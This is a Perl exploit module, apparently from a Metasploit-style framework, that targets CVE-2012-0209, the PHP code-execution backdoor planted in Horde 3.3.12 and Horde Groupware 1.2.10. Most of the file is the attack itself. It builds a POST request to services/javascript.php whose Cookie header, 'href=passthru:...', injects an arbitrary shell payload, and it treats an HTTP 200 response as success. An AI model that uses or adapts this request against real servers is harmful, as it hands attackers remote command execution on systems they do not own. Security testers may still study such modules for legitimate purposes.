package HORDE::MSF::HordeHrefBackdoor;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HordeHrefBackdoor";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CTYPE => "application/x-www-form-urlencoded",
  CVE => "CVE-2012-0209",
  DESCRIPTION => "

          This module exploits an arbitrary PHP code execution vulnerability introduced

        as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.

      ",
  METHOD => "POST",
  MSF_MODULE => "horde_href_backdoor",
  OSVDB => 79246,
  REFERENCES => [
    "http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155",
    "http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/",
  ],
  TITLE => "Horde 3.3.12 Backdoor Arbitrary PHP Code Execution",
  VARIABLES => {
    'APP' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/javascript.php',
      PAYLOAD      => 'app=horde&file=open_calendar.js',
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/javascript.php',
      HEADERS      => {
        'Cookie' => 'href=passthru:echo CWsHCV`__PAYLOAD__`CWsHCV',
        'Connection' => 'Close',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
